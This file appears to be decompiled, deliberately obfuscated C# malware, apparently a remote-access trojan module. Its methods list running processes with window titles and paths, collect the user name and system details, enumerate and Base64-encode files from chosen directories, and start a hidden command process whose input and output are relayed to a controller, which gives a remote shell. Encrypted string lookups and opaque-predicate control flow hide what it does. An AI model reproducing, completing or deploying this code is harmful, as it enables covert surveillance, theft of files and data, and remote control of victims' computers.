using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class ___________________
{
	private static Process m__;

	private static bool m___ = false;

	public static void _()
	{
		try
		{
			string text = _003CModule_003E.____<string>(1157226556u);
			Process[] processes = Process.GetProcesses();
			int id = default(int);
			string[] array = default(string[]);
			foreach (Process process in processes)
			{
				try
				{
					_ = process.ProcessName;
					string text2;
					try
					{
						text2 = process.MainWindowTitle;
						if (Operators.CompareString(text2, string.Empty, false) == 0)
						{
							text2 = _003CModule_003E.______<string>(555695132u);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						text2 = _003CModule_003E.___<string>(2354836464u);
						ProjectData.ClearProjectError();
					}
					string text3;
					try
					{
						text3 = process.Modules[0].FileName;
						if (Operators.CompareString(text3, string.Empty, false) == 0)
						{
							text3 = _003CModule_003E._______<string>(640289527u);
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						text3 = _003CModule_003E._______<string>(640289527u);
						ProjectData.ClearProjectError();
					}
					try
					{
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					if ((0x7ABu ^ (uint)(-(id * 86 + id * 42))) != 0)
					{
						array = new string[9] { text, null, null, null, null, null, null, null, null };
						int num = (int)((nint)Type.EmptyTypes.LongLength + -30017);
						int ________________ = _003CModule_003E._________________;
						switch (((-597377024 & (________________ * 1024)) == ((628 * ________________ + ________________ * 396) & -597377024)) ? ((nint)Type.EmptyTypes.LongLength + 0) : (((0x129C & id) + 732 == 1817089838) ? ((nint)Type.EmptyTypes.LongLength + 2147288645) : ((nint)Type.EmptyTypes.LongLength + 1142915169)))
						{
						}
						array[1] = process.ProcessName;
						array[2] = _003CModule_003E.___<string>(1971668521u);
						int num2 = num;
						num = 8028;
						if (num2 == -30017)
						{
							string[] array2 = array;
							id = process.Id;
							array2[3] = id.ToString();
							if (num == 8225)
							{
							}
						}
					}
					array[4] = _003CModule_003E.______<string>(2515668095u);
					array[5] = text2;
					array[6] = _003CModule_003E.______<string>(2515668095u);
					array[7] = text3;
					array[8] = _003CModule_003E.____<string>(3008796200u);
					text = string.Concat(array);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			______________________________________________________________.____________(text);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			string text = _003CModule_003E._____<string>(471224930u);
			string string_ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + _________________________________________________________________._______(), text), _____________________________________________________________________._________()), (object)text), (object)_________________________________________________________________.______________()), (object)text), (object)_________________________________________________________________.__________________()), (object)text), (object)_________________________________________________________________.___________________()), (object)text), (object)_________________________________________________________________.____________________()), (object)text), (object)Environment.UserName), (object)text), (object)_________________________________________________________________.________________()), (object)text), (object)_________________________________________________________________._________________()), (object)text), (object)_________________________________________________________________._______________()), (object)text), (object)_________________________________________________________________._____________()), (object)text), (object)_________________________________________________________________.____________()), (object)text), (object)_________________________________________________________________.__________()), (object)text), (object)_________________________________________________________________.___________()), (object)text), (object)_____________________________________________________________________________.__), (object)text));
			______________________________________________________________._____________(_003CModule_003E.____<string>(1779488812u) + ___________________________________________________________________.____(string_));
			Thread thread = new Thread(___);
			__________________________________.____________ = 1648825765;
			Thread thread2 = thread;
			thread2.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 82:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					text = _________________________________________________________________._________();
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				______________________________________________________________.____________(_003CModule_003E._______<string>(2979477093u) + text + _003CModule_003E._____<string>(1052623516u));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 82;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ____(string string_0)
	{
		try
		{
			int _______________ = _003CModule_003E.________________;
			int num = default(int);
			if (((uint)(_______________ * -2046820352 - 6655) ^ 0xB82u) != 0)
			{
				num = _003CModule_003E.___________;
				if (((((9170 + num * 408289280) | -11138) == -2050) ? ((nint)Type.EmptyTypes.LongLength + -30126) : ((nint)Type.EmptyTypes.LongLength + 2111291183)) == -30126)
				{
					goto IL_0109;
				}
				goto IL_0160;
			}
			nint num2 = sizeof(short) + -2145285158;
			goto IL_0125;
			IL_0125:
			string text = _003CModule_003E.__________((int)num2, sizeof(Guid) + 64410, (int)((nint)Type.EmptyTypes.LongLength + 144));
			int num3 = default(int);
			int num4 = default(int);
			nint num5;
			if (-(num3 * 671 + 353 * num3) != 6402)
			{
				num4 = _003CModule_003E.___________;
				num5 = (((int)((uint)num4 >> 2) * -1308622848 == -5848) ? (sizeof(short) + -1329811296) : (((((uint)(~(num4 * 633 + 1415 * num4)) / 62u) ^ 0x80013A1u) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1458) : ((~(((num4 << 22) + -3922) * 16384) == (int)((uint)num4 / 256u)) ? ((nint)Type.EmptyTypes.LongLength + 2006367534) : ((nint)Type.EmptyTypes.LongLength + 1987608199))));
			}
			else
			{
				num5 = (nint)Type.EmptyTypes.LongLength + 1291163002;
			}
			if (num5 != -1458)
			{
				goto IL_0109;
			}
			goto IL_0160;
			IL_0109:
			num2 = (nint)Type.EmptyTypes.LongLength + 63475;
			goto IL_0125;
			IL_0160:
			string[] array = default(string[]);
			if (Directory.Exists(______________________.___))
			{
				string text2 = _003CModule_003E.____<string>(3631058456u);
				DirectoryInfo directoryInfo = new DirectoryInfo(______________________.___);
				FileInfo[] files = directoryInfo.GetFiles(_003CModule_003E.______<string>(2821604880u));
				int i;
				for (i = 0; i < files.Length; i++)
				{
					FileInfo fileInfo = files[i];
					try
					{
						nint num8;
						if ((4 & (-5896 + (0x1E74 | num4))) == 4)
						{
							int num6 = _003CModule_003E.___________;
							int num7;
							if (-(32768 * num6) + ((num6 << 13) - 1056) == 5279)
							{
								num7 = 1757704027;
								num8 = num7;
							}
							else if (16384 * ((0x1FFEAE0 & num6) - 9047) - -588709888 != (num6 ^ num6))
							{
								if ((0x20 & (num4 + 1037206976 << 5)) == (0x20 & (104160 * num4)))
								{
									if (num6 * 102 + 1946 * num6 == 2851)
									{
										num7 = -1668808652;
										num8 = num7;
									}
									else
									{
										num7 = 17168;
										num8 = num7;
									}
								}
								else
								{
									num7 = 1706380069;
									num8 = num7;
								}
							}
							else
							{
								num8 = (nint)Type.EmptyTypes.LongLength + -883082793;
							}
						}
						else
						{
							num8 = (nint)Type.EmptyTypes.LongLength + 2145027821;
						}
						if (17169 != num8)
						{
							int num9;
							do
							{
								array = new string[7] { text2, null, null, null, null, null, null };
								num9 = (int)((nint)Type.EmptyTypes.LongLength + 5728);
								switch ((nint)Type.EmptyTypes.LongLength + 0)
								{
								}
								array[1] = fileInfo.get_Name();
								array[2] = _003CModule_003E.___<string>(2677394803u);
							}
							while (num9 == 28019);
						}
						array[3] = ____________________.____________(fileInfo.Length).ToString();
						array[4] = _003CModule_003E.______<string>(861631917u);
						array[5] = fileInfo.FullName;
						array[6] = _003CModule_003E.____<string>(4093950867u);
						text2 = string.Concat(array);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				text = text + text2 + _003CModule_003E.______<string>(514244381u);
				if (((uint)(i * 67108864 - -7504) >> 26) - 79024 == (uint)i)
				{
				}
				while (Operators.CompareString(text, _003CModule_003E.___<string>(3948117840u), false) == 0)
				{
					nint num10 = (nint)Type.EmptyTypes.LongLength + 2;
					while (true)
					{
						switch (num10)
						{
						case 2:
							text = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 36613), (int)((nint)Type.EmptyTypes.LongLength + 37547), (int)((nint)Type.EmptyTypes.LongLength + 254));
							num10 = (nint)Type.EmptyTypes.LongLength + 0;
							continue;
						case 0:
							goto end_IL_03a4;
						}
						break;
					}
					continue;
					end_IL_03a4:
					break;
				}
			}
			if (Directory.Exists(______________________._____))
			{
				string text3 = _003CModule_003E.___<string>(2536665276u);
				DirectoryInfo directoryInfo2 = new DirectoryInfo(______________________._____);
				FileInfo[] files2 = directoryInfo2.GetFiles(_003CModule_003E._______<string>(3308112381u));
				int num11 = default(int);
				int num12 = default(int);
				foreach (FileInfo fileInfo2 in files2)
				{
					try
					{
						if (~((uint)num / 304u / 1073741824u) == (uint)(0 * num))
						{
							goto IL_041b;
						}
						goto IL_043e;
						IL_043e:
						do
						{
							array = new string[7] { text3, null, null, null, null, null, null };
							num11 = -20883;
						}
						while (num12 - 1610612736 == num12);
						goto IL_041b;
						IL_041b:
						array[1] = fileInfo2.get_Name();
						array[2] = _003CModule_003E.____<string>(3008796200u);
						if (num11 != -20883)
						{
							goto IL_043e;
						}
						array[3] = ____________________.____________(fileInfo2.Length).ToString();
						array[4] = _003CModule_003E.____<string>(3008796200u);
						array[5] = fileInfo2.FullName;
						array[6] = _003CModule_003E.____<string>(4093950867u);
						text3 = string.Concat(array);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				string text4 = text;
				string text5 = text3;
				__________________________________________________________________________.___ = 1952428595;
				text = text4 + text5 + _003CModule_003E.___<string>(2536665276u);
				if (text.Contains(_003CModule_003E.___<string>(3564949897u)))
				{
					text = text.Replace(_003CModule_003E._______<string>(292283964u), string.Empty);
				}
			}
			text = text + _003CModule_003E.____<string>(261875982u) + _____________________________________________________________________.___(string_0) + _003CModule_003E.______<string>(2807787963u);
			______________________________________________________________._____________(_003CModule_003E._______<string>(2467153886u) + ___________________________________________________________________.____(text));
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static string _____()
	{
		try
		{
			if (Directory.Exists(______________________.___))
			{
				string text = string.Empty;
				DirectoryInfo directoryInfo = new DirectoryInfo(______________________.___);
				FileInfo[] files = directoryInfo.GetFiles(_003CModule_003E.____<string>(3168166045u));
				foreach (FileInfo fileInfo in files)
				{
					try
					{
						text = text + fileInfo.get_Name() + _003CModule_003E._______<string>(1023697363u);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(text, string.Empty, false) != 0)
				{
					return text;
				}
			}
			return _003CModule_003E.______<string>(2154463642u);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.____<string>(1187660804u), _003CModule_003E._____<string>(2381521097u) + ex2.ToString());
			string result = _003CModule_003E._____<string>(1296256311u);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string ______(string string_0)
	{
		try
		{
			if (File.Exists(______________________.___ + string_0))
			{
				string s = File.ReadAllText(______________________.___ + string_0);
				return Convert.ToBase64String(Encoding.Unicode.GetBytes(s));
			}
			return Convert.ToBase64String(Encoding.Unicode.GetBytes(_003CModule_003E.____<string>(1073122417u)));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E.____<string>(3372367348u) + ex2.ToString());
			string result = Convert.ToBase64String(Encoding.Unicode.GetBytes(_003CModule_003E.___<string>(157537695u)));
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void _______()
	{
		try
		{
			if (_________())
			{
				______________________________________________________________.____________(_003CModule_003E.______<string>(530025909u));
				return;
			}
			Thread thread = new Thread(________);
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ________()
	{
		try
		{
			ProcessStartInfo processStartInfo;
			int num = default(int);
			do
			{
				processStartInfo = new ProcessStartInfo(_003CModule_003E._____<string>(1931166709u));
				processStartInfo.WorkingDirectory = _003CModule_003E._______<string>(1629533668u);
			}
			while ((0xBA0 ^ num) - 71614464 == (int)(((uint)num / 8192u + 3036) * 8192));
			processStartInfo.Arguments = _003CModule_003E.______<string>(182638373u);
			processStartInfo.CreateNoWindow = true;
			switch (sizeof(long))
			{
			default:
				processStartInfo.UseShellExecute = false;
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.RedirectStandardOutput = true;
				break;
			case 9:
				break;
			}
			processStartInfo.RedirectStandardError = true;
			___________________.m__ = Process.Start(processStartInfo);
			___________________.m___ = true;
			Thread thread = new Thread(____________);
			thread.Start();
			___________(_003CModule_003E.____<string>(1854754518u));
			______________________________________________________________.____________(_003CModule_003E.______<string>(488575158u));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			______________________________________________________________.____________(_003CModule_003E.______<string>(2476181955u));
			ProjectData.ClearProjectError();
		}
	}

	public static bool _________()
	{
		try
		{
			if (___________________.m__ == null)
			{
				return false;
			}
			if (___________________.m__.HasExited)
			{
				return false;
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void __________()
	{
		try
		{
			if (___________________.m__ != null && !___________________.m__.HasExited)
			{
				______________________________________________________________.____________(_003CModule_003E.______<string>(2462365038u));
				___________________.m___ = false;
				___________________.m__.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			___________________.m__.StandardInput.WriteLine(string_0);
			___________________.m__.StandardInput.WriteLine();
			___________________.m__.StandardInput.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ____________()
	{
		try
		{
			bool flag = false;
			___________________.m__.StandardInput.WriteLine(_003CModule_003E.___<string>(2255206222u));
			___________________.m__.StandardInput.Flush();
			___________________.m__.StandardOutput.ReadLine();
			nint num = (nint)Type.EmptyTypes.LongLength + 3;
			string text = default(string);
			int num2 = default(int);
			StringBuilder stringBuilder = default(StringBuilder);
			string text2 = default(string);
			while (true)
			{
				switch (num)
				{
				case 4:
					text = ___________________.m__.StandardOutput.ReadLine();
					num = sizeof(ulong) + -6;
					break;
				default:
					___________________.m__.StandardOutput.ReadLine();
					goto IL_0077;
				case 2:
					if (!string.IsNullOrEmpty(text))
					{
						if (!flag)
						{
							if (flag = text.Contains(_003CModule_003E.______<string>(4088767382u)))
							{
								goto IL_02bb;
							}
							if ((int)(139 * ((uint)num2 / 8u) + 117 * ((uint)num2 / 8u)) - -134217728 == 32 * num2)
							{
								goto case 1;
							}
						}
						stringBuilder.AppendLine(text);
						goto case 4;
					}
					goto IL_02bb;
				case 1:
				{
					string text3 = text2;
					int ______________ = _003CModule_003E._______________;
					nint num3;
					if ((0xF & ~(______________ * 120 + 8 * ______________)) != 15)
					{
						num3 = ((______________ * 454 + ______________ * 58 - -469762048 != (______________ ^ 0x10C1) << 9) ? (sizeof(short) + -1662734877) : ((((uint)(1420 * ______________ + 5286 + 628 * ______________) >> 11) + 7921 == (uint)______________) ? (-1895141614) : ((nint)Type.EmptyTypes.LongLength + -1692412010)));
					}
					else if ((((uint)(______________ * 264 + ______________ * 1784) >> 5 >> 6) & 1) != (uint)(1 & -______________))
					{
						num3 = (nint)Type.EmptyTypes.LongLength + 1538822975;
					}
					else if (-553648128 + (0xA5 ^ ______________) == ______________)
					{
						num3 = (nint)Type.EmptyTypes.LongLength + -961780388;
					}
					else
					{
						int ______________2 = _003CModule_003E._______________;
						int num4 = ______________2 * 1046723648 - 3578 - 266528;
						int num5 = _003CModule_003E.__________;
						if (num4 != (8 * num5 + 8 * num5) * 4)
						{
							num2 = _003CModule_003E.___________;
							num3 = ((-(609664 * num2) == 6337) ? (-1635659423) : ((nint)Type.EmptyTypes.LongLength + 91));
						}
						else
						{
							num3 = (nint)Type.EmptyTypes.LongLength + 1146000540;
						}
					}
					if (Operators.CompareString(text3, _003CModule_003E.__________(11627, 12600, (int)num3), false) != 0)
					{
						______________________________________________________________.____________(_003CModule_003E._______<string>(440569610u) + text2.TrimEnd(new char[0]) + _003CModule_003E._____<string>(917869336u));
					}
					goto IL_0077;
				}
				case 0:
					{
						Thread.CurrentThread.Abort();
						goto IL_00bb;
					}
					IL_02bb:
					stringBuilder.AppendLine();
					text2 = stringBuilder.ToString();
					num = sizeof(long) + -7;
					break;
					IL_0077:
					if (___________________.m___)
					{
						if (___________________.m___ && ___________________.m__.HasExited)
						{
							______________________________________________________________.____________(_003CModule_003E.___<string>(2960932504u));
							Thread.Sleep(500);
							num = sizeof(ushort) + -2;
							break;
						}
						goto IL_00bb;
					}
					return;
					IL_00bb:
					stringBuilder = new StringBuilder();
					___________________.m__.StandardOutput.ReadLine();
					num = (nint)Type.EmptyTypes.LongLength + 4;
					break;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
